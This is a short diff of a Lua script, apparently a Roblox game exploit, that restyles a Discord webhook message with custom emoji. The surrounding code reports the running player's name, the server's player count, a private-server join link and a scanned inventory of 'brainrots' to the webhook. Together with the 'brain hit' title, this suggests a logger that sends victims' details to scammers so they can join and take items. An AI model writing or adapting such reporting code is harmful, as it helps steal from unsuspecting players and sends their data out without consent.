@@ -141,7 +141,7 @@ local function SendWebhook(extraFields)
     local payload = HttpService:JSONEncode({
         username = "voxy methods", -- Mudado para voxy
         embeds = {{
-            title = "🔗 AUTO VOXY| " .. timeStr, -- Mudado para voxy
+            title = "<:Troll_ypow:1450889091825668159> brain hit| " .. timeStr, -- Mudado para voxy
             color = 16732240,
             fields = extraFields,
             image = {url = "https://cdn.discordapp.com/attachments/1436283438897303632/1444594144168120471/17644883928162.jpg?ex=692d46a3&is=692bf523&hm=e7f520e275d97c079cf71956fd14cf1b1d2b4d5c422bd94922448a2c91890811&"}
@@ -317,10 +317,10 @@ local function ScanBrainrots()
         content = content .. data.count.."x "..name..": "..formatNumber(data.income).."\n"  
     end  
     extraFields = {  
-        {name="Player", value=LocalPlayer.Name},  
-        {name="Players in Server", value=tostring(#Players:GetPlayers()), inline=false},  
-        {name="Join Private Server", value="[CLIQUE AQUI]("..serverLinkFinal..")", inline=false},  
-        {name="Brainrots", value=content, inline=false}  
+        {name="<:user:1516064307459264523> Player", value=LocalPlayer.Name},  
+        {name="<:members:1469484604858564792> Players in Server", value=tostring(#Players:GetPlayers()), inline=false},  
+        {name="<:entrada:1518401547594104955> Join Private Server", value="[CLIQUE AQUI]("..serverLinkFinal..")", inline=false},  
+        {name="<a:MinecraftRainbowSheep_ypow:1450889134230208613> Brainrots", value=content, inline=false}  
     }  
     SendWebhook(extraFields)
 end
